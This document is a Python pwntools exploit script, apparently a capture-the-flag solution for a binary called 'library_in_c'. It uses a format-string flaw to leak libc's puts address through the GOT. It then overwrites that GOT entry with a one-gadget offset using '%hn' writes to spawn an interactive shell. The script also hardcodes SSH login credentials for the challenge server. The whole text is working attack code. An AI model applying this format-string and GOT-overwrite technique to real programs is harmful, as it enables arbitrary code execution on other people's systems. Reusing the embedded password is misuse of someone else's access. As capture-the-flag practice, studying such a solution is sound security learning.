from pwn import *

e = ELF("./library_in_c")
libc = ELF("./libc.so.6")

context.binary = e.path

if "--remote" in sys.argv:
  s = ssh("team5344", "shell.actf.co", password="4d9ef3c02b7e52dc9ed3")
  p = s.run("/problems/2020/library_in_c/library_in_c")
else:
  p = process(e.path, env={"LD_PRELOAD": libc.path})

p.sendlineafter("?", ";%12$s;".ljust(0x20, "\x00") + p64(e.got["puts"]))

p.recvuntil(";")
leak = u64(p.recvuntil(";", drop=True).ljust(8, "\x00")) - libc.symbols["puts"]

print(hex(leak))

goal = leak + 0x4526a
A = (goal // 0x10000) % 0x10000
B = goal % 0x10000

if B < A:
  tmp = B
  B = A
  A = tmp


p.sendlineafter("?", (
    "%" + str(A) + "x" + "%20$hn" +
    "%" + str(B - A) + "x" + "%21$hn"
  ).ljust(0x20, "\x00")
  + p64(e.got["puts"])
  + p64(e.got["puts"] + 2)
)

p.interactive()
